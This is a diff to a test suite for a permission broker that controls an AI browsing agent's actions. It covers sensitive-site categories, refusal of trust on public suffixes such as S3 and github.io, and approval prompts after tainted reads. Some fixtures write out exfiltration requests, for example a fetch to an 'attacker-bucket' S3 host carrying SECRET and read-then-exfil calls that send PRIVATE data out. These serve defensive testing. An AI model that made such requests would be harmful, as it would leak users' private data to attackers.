@@ -288,15 +288,13 @@ describe("Balanced reads of a trusted site", () => {
     }
   });
 
-  it("a hard-blocked venue stays blocked for anything but a read (control: the read)", async () => {
-    const h = makeBroker();
+  it("a brokerage, exchange or bank gets no trust offer (control: an ordinary host does)", async () => {
     const venue = "https://www.kraken.com";
-    await trust(h, venue);
-    expect((await h.broker.decide(nav(venue), TASK2)).decision).toBe("allow");
-    const buy = call("browser.click", "financial", origin(venue), {
-      meta: { action: "click", control: { labels: ["Buy"], role: "button" } },
-    });
-    expect((await h.broker.decide(buy, TASK2)).decision).toBe("deny");
+    const h = makeBroker();
+    await expect(trust(h, venue)).rejects.toThrow(/does not offer/);
+    expect(await h.broker.listGrants({})).toHaveLength(0);
+    await trust(h);
+    expect(await h.broker.listGrants({})).toHaveLength(1);
   });
 
   const LOOKALIKES: [string, string][] = [
@@ -503,10 +501,11 @@ describe("answering Always for this site is bounded", () => {
   });
 });
 
-describe("optional sensitive categories", () => {
+describe("optional sensitive categories (on by default, the owner may turn them off)", () => {
   const host = (p: ReturnType<typeof compilePolicy>, h: string) => isSensitiveHost(p, h);
-  const ON = DEFAULT_SENSITIVE_ORIGINS;
-  it("banks, health, email, password managers and sign-in stay on by default", () => {
+  const GOV_ICLOUD = ["irs.gov", "www.usa.gov", "service.gov.uk", "icloud.com", "www.icloud.com"];
+
+  it("banks, health, email, password managers, sign-in, gov and iCloud are on by default", () => {
     const p = compilePolicy({});
     for (const h of [
       "chase.com",
@@ -517,53 +516,145 @@ describe("optional sensitive categories", () => {
       "outlook.office.com",
       "accounts.google.com",
       "appleid.apple.com",
+      ...GOV_ICLOUD,
     ]) {
       expect(host(p, h), h).toBe(true);
     }
-    expect(ON).not.toContain("*.gov");
-    expect(ON).not.toContain("*.icloud.com");
+    expect(DEFAULT_SENSITIVE_ORIGINS).toContain("*.gov");
+    expect(DEFAULT_SENSITIVE_ORIGINS).toContain("*.icloud.com");
   });
 
-  const OFF_BY_DEFAULT = [
-    "irs.gov",
-    "www.usa.gov",
-    "service.gov.uk",
-    "icloud.com",
-    "www.icloud.com",
-  ];
-  it.each(OFF_BY_DEFAULT)(
-    "%s is not sensitive by default (control: sensitive once its category is on)",
-    (h) => {
-      expect(host(compilePolicy({}), h)).toBe(false);
-      const on = compilePolicy({ sensitiveCategories: { government: true, icloud: true } });
-      expect(host(on, h)).toBe(true);
-    },
-  );
-
-  it("each category toggles only its own hosts", () => {
-    const gov = compilePolicy({ sensitiveCategories: { government: true } });
-    expect(host(gov, "irs.gov")).toBe(true);
-    expect(host(gov, "icloud.com")).toBe(false);
-    const ic = compilePolicy({ sensitiveCategories: { icloud: true } });
-    expect(host(ic, "icloud.com")).toBe(true);
-    expect(host(ic, "irs.gov")).toBe(false);
-    // A look-alike is never matched by the category.
-    expect(host(gov, "irs.gov.evil.example")).toBe(false);
-    expect(host(gov, "notgov.example")).toBe(false);
+  it.each(GOV_ICLOUD)("%s stops being sensitive only when both categories are off", (h) => {
+    expect(
+      host(compilePolicy({ sensitiveCategories: { government: true, icloud: true } }), h),
+    ).toBe(true);
+    expect(
+      host(compilePolicy({ sensitiveCategories: { government: false, icloud: false } }), h),
+    ).toBe(false);
   });
 
-  it("with the category off, a gov read in Balanced asks only as a new source", async () => {
+  it("each category switches only its own hosts off", () => {
+    const noGov = compilePolicy({ sensitiveCategories: { government: false } });
+    expect(host(noGov, "irs.gov")).toBe(false);
+    expect(host(noGov, "icloud.com")).toBe(true);
+    expect(host(noGov, "chase.com")).toBe(true);
+    const noIcloud = compilePolicy({ sensitiveCategories: { icloud: false } });
+    expect(host(noIcloud, "icloud.com")).toBe(false);
+    expect(host(noIcloud, "irs.gov")).toBe(true);
+    expect(host(noIcloud, "mail.google.com")).toBe(true);
+  });
+
+  it("with the category on a gov read asks as sensitive; off, as an ordinary new source", async () => {
     const h = makeBroker();
-    expect((await h.broker.decide(nav("https://www.irs.gov"), CTX)).rule).toBe(
-      "mode:balanced/read:new_source",
-    );
-    h.broker.setPolicy({ sensitiveCategories: { government: true } });
     expect((await h.broker.decide(nav("https://www.irs.gov"), CTX)).rule).toBe(
       "mode:balanced/read:sensitive",
     );
+    h.broker.setPolicy({ sensitiveCategories: { government: false } });
+    expect((await h.broker.decide(nav("https://www.irs.gov"), CTX)).rule).toBe(
+      "mode:balanced/read:new_source",
+    );
   });
 
-  it("an owner who listed *.gov in sensitiveOrigins keeps it", () => {
-    expect(host(compilePolicy({ sensitiveOrigins: ["*.gov"] }), "irs.gov")).toBe(true);
+  it("the card never offers Always for this site on a sensitive host, gov or iCloud included", async () => {
+    for (const url of ["https://www.irs.gov", "https://www.icloud.com"]) {
+      const h = makeBroker();
+      await expect(trust(h, url), url).rejects.toThrow(/does not offer/);
+      // Positive control: turn its category off and the offer appears.
+      h.broker.setPolicy({ sensitiveCategories: { government: false, icloud: false } });
+      await trust(h, url, "origin", { ...CTX, taskId: "t_off", runId: "r_off" });
+      expect(await h.broker.listGrants({}), url).toHaveLength(1);
+    }
   });
+});
+
+describe("subdomain trust refuses public and private suffixes (PSL)", () => {
+  const REFUSE = [
+    "https://s3.amazonaws.com",
+    "https://s3.us-east-1.amazonaws.com",
+    "https://storage.googleapis.com",
+    "https://blob.core.windows.net",
+    "https://run.app",
+    "https://r2.dev",
+    "https://cloudfunctions.net",
+    "https://readthedocs.io",
+    "https://uk.com",
+    "https://me.uk",
+    "https://kyoto.jp",
+    "https://vercel.app",
+    "https://herokuapp.com",
+    "https://github.io",
+    "https://raw.githubusercontent.com",
+    "https://gist.githubusercontent.com",
+  ];
+  it.each(REFUSE)("%s cannot be trusted, with or without subdomains", (u) => {
+    expect(() => normalizeTrustedSite(u, true)).toThrow();
+    expect(() => normalizeTrustedSite(u, false)).toThrow();
+  });
+  it.each([
+    "https://example.com",
+    "https://bbc.co.uk",
+    "https://docs.python.org",
+    "https://tenant.github.io",
+  ])("control: %s can be trusted with subdomains", (u) => {
+    expect(() => normalizeTrustedSite(u, true)).not.toThrow();
+  });
+
+  it("a tenant bucket stays asking after a trust attempt on the suffix", async () => {
+    const h = makeBroker();
+    await expect(trust(h, "https://s3.amazonaws.com", "subdomains")).rejects.toThrow();
+    const fetchTenant = fetchGet("https://attacker-bucket.s3.amazonaws.com/?d=SECRET");
+    expect((await h.broker.decide(fetchTenant, TASK2)).decision).toBe("ask");
+    // Positive control: the same shape on a trusted ordinary host is quiet.
+    await trust(h, "https://example.com", "subdomains");
+    expect(
+      (await h.broker.decide(fetchGet("https://a.example.com/?d=x"), { ...TASK2, taskId: "t7" }))
+        .decision,
+    ).toBe("allow");
+  });
+});
+
+describe("a trusted read does not make the origin touched (read-then-exfil)", () => {
+  const tainted = (c: PolicyContext): PolicyContext => ({
+    ...c,
+    taint: true,
+    taintSources: [{ sourceKind: "browser", origin: SITE }],
+  });
+  const exfil = [
+    ["web.fetch", () => fetchGet(`${SITE}/search?q=PRIVATE`)],
+    [
+      "browser.open_tab",
+      () =>
+        call("browser.open_tab", "read", origin(SITE), { params: { url: `${SITE}/?q=PRIVATE` } }),
+    ],
+  ] as const;
+
+  it.each(exfil)("%s asks in the same task after taint arrives", async (_n, make) => {
+    const h = makeBroker();
+    await trust(h);
+    const ctx: PolicyContext = { ...CTX, taskId: "task_x", runId: "run_x" };
+    // Positive control: the untainted trusted read is quiet.
+    expect((await h.broker.decide(nav(SITE), ctx)).rule).toBe("mode:balanced/read:trusted_site");
+    expect((await h.broker.decide(make(), tainted(ctx))).decision).toBe("ask");
+  });
+
+  it.each(exfil)(
+    "%s asks in a thread-keyed context (no task), and on the next tainted turn",
+    async (_n, make) => {
+      const h = makeBroker();
+      await trust(h);
+      const ctx: PolicyContext = {
+        threadId: "thr_chat",
+        runId: "run_a",
+        permissionMode: "balanced",
+        taint: false,
+      };
+      expect((await h.broker.decide(snapshot(SITE), ctx)).rule).toBe(
+        "mode:balanced/read:trusted_site",
+      );
+      expect((await h.broker.decide(make(), tainted(ctx))).decision).toBe("ask");
+      expect((await h.broker.decide(make(), tainted({ ...ctx, runId: "run_b" }))).decision).toBe(
+        "ask",
+      );
+    },
+  );
 });
